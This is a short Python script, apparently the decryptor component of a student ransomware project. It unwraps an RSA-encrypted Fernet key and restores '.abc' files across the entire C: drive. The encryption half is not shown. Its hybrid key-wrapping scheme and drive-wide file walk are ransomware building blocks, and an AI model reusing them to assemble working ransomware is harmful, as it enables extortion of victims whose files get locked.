from cryptography.fernet import Fernet
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
import os



class ransom():
    # class method
    file_ext = ['abc']
    def __init__(self):
        self.key = None
        self.privatekey = None
        self.crypter = None
        self.rootpath = 'c:/'
        self.testpath = r'C:\Users\ksh\Desktop\ransomtest'

    # key 복호화
    def dec_key(self):
        with open('c:/ransom/fernet_key.txt', 'rb') as rf:
            enc_key = rf.read()

        with open('c:/ransom/fernet_key.txt', 'wb') as wf:
            self.privatekey = RSA.import_key(open('C:/key/private.pem').read())
            private_crypter = PKCS1_OAEP.new(self.privatekey)
            self.key = private_crypter.decrypt(enc_key)
            wf.write(self.key)

        self.crypter = Fernet(self.key)

    # 파일 복호화
    def dec_execute(self, filepath):
        try:
            with open(filepath, 'rb') as rf:
                enc_data = rf.read()
                data = self.crypter.decrypt(enc_data)

            dec_filepath = os.path.splitext(filepath)[0]
            with open(dec_filepath, 'wb') as wf:
                wf.write(data)
            print("Decrypt : ", dec_filepath)
            os.remove(filepath)

        except PermissionError:
            pass

    # 파일 탐색
    def searchfile(self):
        for path, dir, files in os.walk(self.rootpath):
            for file in files:
                filepath = os.path.join(path, file)
                if file.split('.')[-1] in self.file_ext:
                    self.dec_execute(filepath)


if __name__ == '__main__':
    ran = ransom()

    ran.dec_key()                       # 대칭 key 복호화
    ran.searchfile()                    # 파일 탐색, 복호화

    print("Decrypt complete")